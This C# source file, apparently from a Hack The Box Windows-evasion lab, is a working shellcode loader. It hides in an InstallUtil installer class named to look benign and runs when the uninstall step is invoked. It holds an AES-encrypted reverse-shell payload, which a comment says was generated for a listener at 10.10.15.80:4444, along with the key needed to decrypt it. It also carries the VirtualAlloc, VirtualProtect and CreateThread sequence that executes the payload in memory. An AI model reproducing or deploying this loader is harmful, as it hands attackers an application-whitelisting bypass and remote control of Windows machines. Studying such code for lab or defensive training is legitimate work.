using System;
using System.Runtime.InteropServices;
using System.Collections;
using System.Configuration.Install;
using System.Security.Cryptography;

public class NotMalware_IU
{
        static void Main(string[] args)
        {
        }
}

[System.ComponentModel.RunInstaller(true)]
// Arbitrarily named public class A will override the Uninstall method. When telling InstallUtil to uninstall, it will execute micr0shell instead.
public class A: System.Configuration.Install.Installer
{
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public override void Uninstall(IDictionary savedState)
    {
        // CODE EXECUTION
        //┌──(.micr0_shell)─(majora㉿kali)-[~/…/majora_kali/HTB/Modules/Win_Evasion]
        //└─$microshell--ip 10.10.15.80--port 4444--language csharp
        //newlines replaced before crafting CyberChef recipe



        string bufEnc = "vET7JrlOiNB5nQ7lxuOvQ9o01/cgBt+Po+vttJqwpZjrgq8u+6gRzpAPMZEkfNh3WsY5EpEU1uBn9RjGWuXf4uUMM61EZxo7DRaYjpaTNv7mHyuhrUd/xY6LGLjgqgcBnnRacyEI7oNct8pi0T9KEW1YmK1WgGfqptGE3M5Wg1r9Bud5BweUJwftMt6JsgbIsMl0hwEVz5+uR8hjdvIuWVAw0lm4P069Ce9EraeguDNSnlcqhJnnOgu+lx/P4mo3tPHn2DNJyhe3Zl5JyQlccxBSKHU3gr3VzmIyNNk9ej7CznIR2F/7ZVnAx37BtSeobLn/7g9reAkhh6EzT+DibOBUTJBMBYn6tVXMC37LadYxtDj12Ms0uCVIH/dcy98QvHszSgd+F7LudIQBEShImwaQk7ZVYBsjkyx9UVYtY7UnXNgx4dLZZVKhyfdKMDqclrZjstCNyaPrE5NM4vkqwsCTBTSn5odWMsibg1T2ydO9z9dQSKF/a0T7enU+AnbKrSc6Gy7rzHBKYXj0wHNVRyZjfnOEz+ob/GDp2PlqDKhoKhN0k0pe2b6NfRSItonDHzIhjwkku1qb/yM6/R0xs8l0r3rmAAJ3OaFautybv4eO51G2B6fzwXbD+Q6mp1SH";

        //Decrypt shellcode
        Aes aes = Aes.Create();
        byte[] key = new byte[16] { 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 };
        byte[] iv = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 };
        ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
        byte[] buf;
        using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc)))
        {
            using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
            {
                using (var msPlain = new System.IO.MemoryStream())
                {
                    csDecrypt.CopyTo(msPlain);
                    buf = msPlain.ToArray();
                }
            }
        }
        // Allocate RW space for shellcode
        IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (UInt32)buf.Length, 0x1000, 0x04);


        // Copy shellcode into allocated space
        Marshal.Copy(buf, 0, lpStartAddress, buf.Length);

        // Make shellcode in memory executable
        UInt32 lpflOldProtect;
        VirtualProtect(lpStartAddress, (UInt32)buf.Length, 0x20, out lpflOldProtect);

        // Execute the shellcode in a new thread
        UInt32 lpThreadId = 0;
        IntPtr hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0, ref lpThreadId);

        // Wait until the shellcode is done executing
        WaitForSingleObject(hThread, 0xffffffff);

    }
}